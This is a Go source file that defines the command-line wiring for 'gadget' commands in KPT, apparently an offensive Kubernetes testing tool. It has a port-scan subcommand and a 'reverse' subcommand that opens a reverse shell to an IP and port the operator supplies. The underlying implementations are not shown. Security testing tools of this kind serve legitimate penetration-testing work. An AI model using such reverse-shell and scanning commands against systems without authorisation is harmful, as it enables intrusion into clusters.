/*
Copyright © 2021 Zuoyu Qiu <17803091056@sjtu.edu.cn>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"strconv"

	"github.com/KPT/conf"
	gadget "github.com/KPT/gadget/tools"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

// observeCmd represents the auxiliary command
var gadgetCmd = &cobra.Command{
	Use:   "gadget",
	Short: "Gadget module of KPT",
	Long:  `Gadget module is used to offer comfort, which will be useful during observe and exploit Kubernetes cluster.`,
}

var scanCmd = &cobra.Command{
	Use:   "scan",
	Short: "Try to scan the targeted port.",
	// Args:    cobra.ExactArgs(1),
	Example: `scan full ip or scan ip ports timeout`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 4 && len(args) != 2 {
			log.Println("invalid input args.")
			log.Fatal("Scan target ports: Man in the middle using ExternalIPs, usage: kpt gadget scan ip port parallel timeout")
			return
		}
		switch args[0] {
		case "full":
			log.Info("Scan cluster in full mode!")
			gadget.Scan(args[1], conf.ScanDefaultPorts, 50, 1000)
		default:
			// strconv.ParseInt(string, 10, 64)
			a, _ := strconv.ParseInt(args[2], 10, 64)
			b, _ := strconv.Atoi(args[3])
			gadget.Scan(args[0], args[1], a, b)
		}
	},
}

var reverseCmd = &cobra.Command{
	Use:     "reverse",
	Short:   "Start a reverse shell",
	Long:    "Start a reverse shell connecting to specified IP and port.",
	Example: "reverse IP Port",
	Args:    cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		gadget.ReverseShell(args[0], args[1])
	},
}

func init() {
	rootCmd.AddCommand(gadgetCmd)
	gadgetCmd.AddCommand(scanCmd, reverseCmd)
	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// observe.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// observeCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
